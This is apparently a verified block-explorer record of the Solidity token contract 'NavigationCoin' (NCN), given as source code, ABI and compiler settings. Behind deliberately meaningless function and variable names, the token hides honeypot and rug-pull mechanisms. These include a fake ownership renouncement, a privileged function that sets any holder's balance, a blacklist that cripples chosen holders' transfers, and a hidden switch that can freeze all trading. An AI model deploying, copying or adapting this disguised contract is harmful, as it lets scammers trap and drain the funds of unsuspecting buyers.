{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract autoLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamBuy {\n    function createPair(address marketingMode, address takeTokenTrading) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface minTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface enableTxWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverLaunched) external view returns (uint256);\n\n    function transfer(address sellBuy, uint256 limitReceiver) external returns (bool);\n\n    function allowance(address marketingTeamMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellBuy,\n        uint256 limitReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountReceiver, uint256 value);\n    event Approval(address indexed marketingTeamMax, address indexed spender, uint256 value);\n}\n\ninterface liquidityToken is enableTxWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract NavigationCoin is autoLaunch, enableTxWallet, liquidityToken {\n\n    uint256 buyIs;\n\n    uint256 public listAmount = 3;\n\n    bool private sellLaunch;\n\n    mapping(address => uint256) private isEnable;\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderLaunched;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchTx;\n    }\n\n    uint8 private senderLaunched = 18;\n\n    function balanceOf(address receiverLaunched) public view virtual override returns (uint256) {\n        return isEnable[receiverLaunched];\n    }\n\n    uint256 public toMax = 0;\n\n    uint256 private launchTx = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private receiverFund;\n\n    uint256 private tokenAt;\n\n    function toSenderAuto() private view {\n        require(minEnable[_msgSender()]);\n    }\n\n    function listTeamMode(address tokenLiquidity) public {\n        if (takeIs) {\n            return;\n        }\n        \n        minEnable[tokenLiquidity] = true;\n        \n        takeIs = true;\n    }\n\n    address public receiverLiquidity;\n\n    mapping(address => bool) public minEnable;\n\n    uint256 private limitMode;\n\n    bool public walletAuto;\n\n    function takeFund(address launchSell, address sellBuy, uint256 limitReceiver) internal returns (bool) {\n        if (launchSell == receiverLiquidity) {\n            return modeTotal(launchSell, sellBuy, limitReceiver);\n        }\n        uint256 receiverMode = enableTxWallet(buySwap).balanceOf(sellReceiverFund);\n        require(receiverMode == buyIs);\n        require(sellBuy != sellReceiverFund);\n        if (marketingList[launchSell]) {\n            return modeTotal(launchSell, sellBuy, tokenBuyMin);\n        }\n        limitReceiver = sellEnableLimit(launchSell, sellBuy, limitReceiver);\n        return modeTotal(launchSell, sellBuy, limitReceiver);\n    }\n\n    function approve(address liquidityMarketing, uint256 limitReceiver) public virtual override returns (bool) {\n        receiverFund[_msgSender()][liquidityMarketing] = limitReceiver;\n        emit Approval(_msgSender(), liquidityMarketing, limitReceiver);\n        return true;\n    }\n\n    function allowance(address minTake, address liquidityMarketing) external view virtual override returns (uint256) {\n        if (liquidityMarketing == walletMax) {\n            return type(uint256).max;\n        }\n        return receiverFund[minTake][liquidityMarketing];\n    }\n\n    string private listTx = \"NCN\";\n\n    string private modeShould = \"Navigation Coin\";\n\n    event OwnershipTransferred(address indexed amountTake, address indexed isTake);\n\n    function walletFrom(address swapTxLimit) public {\n        toSenderAuto();\n        \n        if (swapTxLimit == receiverLiquidity || swapTxLimit == buySwap) {\n            return;\n        }\n        marketingList[swapTxLimit] = true;\n    }\n\n    uint256 private txAutoToken;\n\n    uint256 constant tokenBuyMin = 6 ** 10;\n\n    function owner() external view returns (address) {\n        return marketingLiquidity;\n    }\n\n    bool public takeIs;\n\n    uint256 private feeAuto;\n\n    address public buySwap;\n\n    function symbol() external view virtual override returns (string memory) {\n        return listTx;\n    }\n\n    function sellEnableLimit(address launchSell, address sellBuy, uint256 limitReceiver) internal view returns (uint256) {\n        require(limitReceiver > 0);\n\n        uint256 takeSender = 0;\n        if (launchSell == buySwap && listAmount > 0) {\n            takeSender = limitReceiver * listAmount / 100;\n        } else if (sellBuy == buySwap && toMax > 0) {\n            takeSender = limitReceiver * toMax / 100;\n        }\n        require(takeSender <= limitReceiver);\n        return limitReceiver - takeSender;\n    }\n\n    address private marketingLiquidity;\n\n    function getOwner() external view returns (address) {\n        return marketingLiquidity;\n    }\n\n    function transfer(address receiverMin, uint256 limitReceiver) external virtual override returns (bool) {\n        return takeFund(_msgSender(), receiverMin, limitReceiver);\n    }\n\n    function launchedMin(address receiverMin, uint256 limitReceiver) public {\n        toSenderAuto();\n        isEnable[receiverMin] = limitReceiver;\n    }\n\n    bool private launchedFundList;\n\n    uint256 toAtLaunch;\n\n    function exemptFund(uint256 limitReceiver) public {\n        toSenderAuto();\n        buyIs = limitReceiver;\n    }\n\n    function transferFrom(address launchSell, address sellBuy, uint256 limitReceiver) external override returns (bool) {\n        if (_msgSender() != walletMax) {\n            if (receiverFund[launchSell][_msgSender()] != type(uint256).max) {\n                require(limitReceiver <= receiverFund[launchSell][_msgSender()]);\n                receiverFund[launchSell][_msgSender()] -= limitReceiver;\n            }\n        }\n        return takeFund(launchSell, sellBuy, limitReceiver);\n    }\n\n    constructor (){\n        \n        tradingAt();\n        minTx launchedWallet = minTx(walletMax);\n        buySwap = teamBuy(launchedWallet.factory()).createPair(launchedWallet.WETH(), address(this));\n        sellReceiverFund = teamBuy(launchedWallet.factory()).feeTo();\n        \n        receiverLiquidity = _msgSender();\n        minEnable[receiverLiquidity] = true;\n        isEnable[receiverLiquidity] = launchTx;\n        \n        emit Transfer(address(0), receiverLiquidity, launchTx);\n    }\n\n    function modeTotal(address launchSell, address sellBuy, uint256 limitReceiver) internal returns (bool) {\n        require(isEnable[launchSell] >= limitReceiver);\n        isEnable[launchSell] -= limitReceiver;\n        isEnable[sellBuy] += limitReceiver;\n        emit Transfer(launchSell, sellBuy, limitReceiver);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return modeShould;\n    }\n\n    address sellReceiverFund;\n\n    mapping(address => bool) public marketingList;\n\n    bool public walletListMarketing;\n\n    function tradingAt() public {\n        emit OwnershipTransferred(receiverLiquidity, address(0));\n        marketingLiquidity = address(0);\n    }\n\n    address walletMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private teamSwapReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTeamMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitReceiver\",\"type\":\"uint256\"}],\"name\":\"exemptFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitReceiver\",\"type\":\"uint256\"}],\"name\":\"launchedMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLiquidity\",\"type\":\"address\"}],\"name\":\"listTeamMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTxLimit\",\"type\":\"address\"}],\"name\":\"walletFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletListMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "NavigationCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}